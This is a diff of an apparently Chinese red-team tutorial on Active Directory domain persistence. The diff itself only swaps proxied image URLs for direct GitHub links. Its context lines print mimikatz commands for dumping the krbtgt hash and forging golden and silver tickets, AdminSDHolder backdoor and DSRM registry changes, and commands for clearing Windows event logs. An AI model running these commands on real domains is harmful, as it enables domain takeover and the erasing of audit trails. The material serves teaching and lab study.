@@ -31,7 +31,7 @@ __
     
     privilege::debuglsadump::lsa /inject /name:krbtgt
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114522.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114522.png)
 
 得到krbtgt的hash：
 
@@ -55,7 +55,7 @@ __
     
      mimikatz "kerberos::golden /domain:redteam.local /sid:S-1-5-21-151877218-3666268517-4145415712/krbtgt:c73caed3bc6f0a248e51d37b9a8675fa /user:administrator/ticket:gold.kirbi"
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114531.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114531.png)
 
 可以看到没有任何票证。
 
@@ -65,7 +65,7 @@ __
     
      kerberos::ptt C:\Users\jack\Desktop\gold.kirbi
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114532.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114532.png)
 
 成功导入administrator票据。
 
@@ -73,7 +73,7 @@ __
 
 可以通过事件管理器查看到是以administrator来登录的
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114533.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114533.png)
 
 # 0x02 银票
 
@@ -95,7 +95,7 @@ __
     
     privilege::Debugsekurlsa::logonpasswords
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114534.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114534.png)
 
 ## 2.3 创建银票
 
@@ -105,7 +105,7 @@ __
     
     kerberos::golden /domain:redteam.local/sid:S-1-5-21-151877218-3666268517-4145415712/target:DC.redteam.local/service:cifs /rc4:0703759771e4bed877ecd472c95693a5/user:administrator /ptt
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114535.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114535.png)
 
 psexec获取DC机器cmd
 
@@ -125,7 +125,7 @@ ACL，例如授予普通用户完全权限，则该用户将拥有受保护组�
 其中Administrators、Domain Admins、Enterprise
 Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和组的具备admincount属性值为1的特征。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114536.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114536.png)
 
 ## 3.1 使用powerview查询
 
@@ -135,7 +135,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
     Get-NetUser-AdminCount|select samaccountname
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114537.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114537.png)
 
 查询域中受ad保护的所有组
 
@@ -143,7 +143,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
     Get-netgroup -AdminCount| select name
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114538.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114538.png)
 
 ## 3.2 使用ActiveDirectory
 
@@ -169,7 +169,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
     Get-DomainObjectAcl adminsdholder | ?{$_.SecurityIdentifier-match "S-1-5-21-151877218-3666268517-4145415712-1106"} | select objectdn,ActiveDirectoryRights |sort -Unique
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114539.png)![]()
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114539.png)![]()
 
 默认会等待60分钟，可以通过修改注册表来设置为60秒后触发。
 
@@ -177,7 +177,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
     reg add hklm\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v AdminSDProtectFrequency/t REG_DWORD /d 1/f
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114540.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114540.png)
 
 ## 3.4 恢复
 
@@ -235,7 +235,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
     Set-ItemProperty"HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA"-name DsrmAdminLogonBehavior-value 2
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114542.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114542.png)
 
 ## 4.3 PTH域控
 
@@ -253,7 +253,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
 
 ### 5.1.1 事件管理器
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114543.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114543.png)
 
 ### 5.1.2 powershell
 
@@ -265,7 +265,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
     Get-WinEvent-FilterHashtable@{logname="security";}
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114544.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114544.png)
 
 ## 5.2 windows日志清除方法
 
@@ -277,7 +277,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
      wevtutil.exe gli Applicationwevtutil.exe gli Security
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114545.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114546.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114545.png)![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114546.png)
 
  **查询指定类别的(这里以security举例):**
 
@@ -297,7 +297,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
 
 原本大量日志信息
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114547.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114548.png)![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114549.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114547.png)![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114548.png)![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114549.png)
 
 但是会留下一个事件id为1102的日志清除日志
 
@@ -317,7 +317,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
     
      Clear-EventLog-LogNameSecurity
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114550.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114550.png)
 
 ### 5.2.3 Phantom脚本
 
@@ -325,11 +325,11 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
 
 添加一个用户可以看到产生了日志
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114551.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114551.png)
 
 我们再给删除
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114552.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114552.png)
 
 运行ps1脚本：
 
@@ -337,9 +337,9 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
 
 再次添加用户查看日志：
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114553.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114553.png)
 
-**![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114554.png)**
+**![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114554.png)**
 
   
 
@@ -366,7 +366,7 @@ Admins组对AdminSDHolder上的属性具有写权限，受保护的ad账户和�
 
 原创投稿作者：11ccaab
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114555.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210814114555.png)
 
   
 
